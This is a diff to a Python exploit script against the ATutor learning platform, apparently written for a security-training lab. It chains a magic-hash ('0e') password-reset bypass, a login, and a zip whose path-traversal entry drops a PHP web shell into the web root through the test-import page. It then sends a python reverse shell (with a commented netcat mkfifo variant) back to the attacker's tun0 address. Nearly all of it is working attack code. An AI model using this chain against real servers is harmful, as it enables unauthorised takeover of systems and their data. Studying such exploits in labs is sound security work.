@@ -85,23 +85,111 @@ def reset_password(ip, params):
 def get_code(id, password):
     print("Searching for valid code......")
     
-    for prefix_length in range(1, 5):
-        for word in map(''.join,itertools.product(string.ascii_lowercase, \
-            repeat=int(prefix_length))):
+    pass_prefix = re.findall("^\d+",password)
+    if pass_prefix == []: pass_prefix = 0
+    else: pass_prefix = pass_prefix[0] 
+    print(f"Found password prefix {pass_prefix}")
 
-            raw_string = f"{id}{word}{password}"
-            hash = hashlib.sha1(raw_string.encode()).hexdigest()
-            hash_prefix = hash[5:20]
+    for g in range(1,1000000):
 
-            if re.match(r'0+[eE]\d+$', hash_prefix):
-                print(f"Valid hash: {hash_prefix}")
-                print(f"Raw String: {raw_string}")
-                return word
+        raw_string = str(id + g + int(pass_prefix))
+        hash = hashlib.sha1(raw_string.encode()).hexdigest()
+        hash_prefix = hash[5:20]
+
+        if re.match(r'0+[eE]\d+$', hash_prefix):
+            print(f"Valid hash: {hash_prefix}")
+            print(f"Raw String: {raw_string}")
+            return g
 
     raise Exception("No valid email found!")
     return ""
+def login(ip, username):
+    target = f"http://{ip}/ATutor/login.php"
+    token = "token"
+    PASSWORD = 'Bromine1!'
+    password_hash = hashlib.sha1(PASSWORD.encode()).hexdigest()
+    hashed = hashlib.sha1((password_hash + token).encode('utf-8'))
 
-if __name__ == '__main__':
+    print(f"Logging in as user {username} with password {PASSWORD}......")
+    data = {
+        "submit": "Login",
+        "form_login": username,
+        "form_password_hidden": hashed.hexdigest(),
+        "token":token
+    }
+
+    s = requests.Session()
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    }
+
+    s.headers.update(headers)
+
+    # proxies = {
+    #     'http': 'http://127.0.0.1:8080'
+    # }
+    # s.proxies.update(proxies)
+
+    r = s.post(target, data=data)
+    res = r.text
+
+    if re.search("Invalid login/password combination.",res):
+        raise Exception("Invalid Login!")
+    print("Login Successful!")
+    return s
+
+def build_zip():
+    f = BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+
+    z.writestr('../../../../var/www/html/ATutor/mods/poc.php5', data='<?php system($_GET["cmd"]);?>')
+    z.writestr('imsmanifest.xml', data='invalid file!')
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+def upload_zip(ip, session):
+    print("Uploading ZIP file with malicios PHP file......")
+    build_zip()
+
+    target = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"
+
+    data = {
+        'submit_import': 'Import'
+    }
+
+    with open('poc.zip', 'rb') as file:
+        files = {
+            "file": file
+        }
+
+        r = session.post(target,files=files, data=data)
+
+        if 'XML error' not in r.text:
+            raise "File Upload Failure"
+    print("File Upload Success!")
+    return True
+
+def send_command(ip, session, command):
+    target = f"http://{ip}/ATutor/mods/poc.php5?cmd={command}"
+    r = session.get(target)
+
+    return r.text
+
+def send_reverse_shell(ip, session):
+    print("Sending reverse shell... Ensure netcat listening on port 80")
+    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+    LPORT = 80
+
+    # payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+    payload = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+    print(f"Reverse shell payload: {payload}")
+    send_command(ip, session, payload)
+
+def main():
     if len(sys.argv) != 3:
         print ("(+) usage: %s <target> <atmail>" % sys.argv[0])
         print ('(+) eg: %s 192.168.121.103 192.168.121.106'  % sys.argv[0])
@@ -129,7 +217,36 @@ if __name__ == '__main__':
 
     reset_password('atutor', params = {
         'id': member_id,
-        'h': "xx",
-        'g': "dbsdab"
+        'h': 0,
+        'g': g
     })
 
+    session = login(ip, username)
+
+    # Main page
+    r = session.get(f"http://{ip}/ATutor/users/index.php")
+    text = r.text
+
+    # Get the bounce.php link in the main page response
+    link = re.findall('href="(bounce.php?.*)"', text)
+    if len(link) == 0:
+        raise "No valid course!"
+    print(f"Visiting intermediate link: {link[0]}")
+
+    # Visit the bounce.php link to choose the course
+    r = session.get(f"http://{ip}/ATutor/{link[0]}")
+
+    # Upload zip file with malicious PHP
+    upload_zip(ip, session)
+
+    # Send command to our uploaded reverse shell
+    # Use ifconfig to test that reverse shell is working
+    resp = send_command(ip, session, 'ifconfig')
+    if '127.0.0.1' not in resp:
+        raise "Remote Code Execution Failure!"
+    print("Remote Code Execution working!")
+
+    resp = send_reverse_shell(ip, session)
+
+if __name__ == '__main__':
+    main()
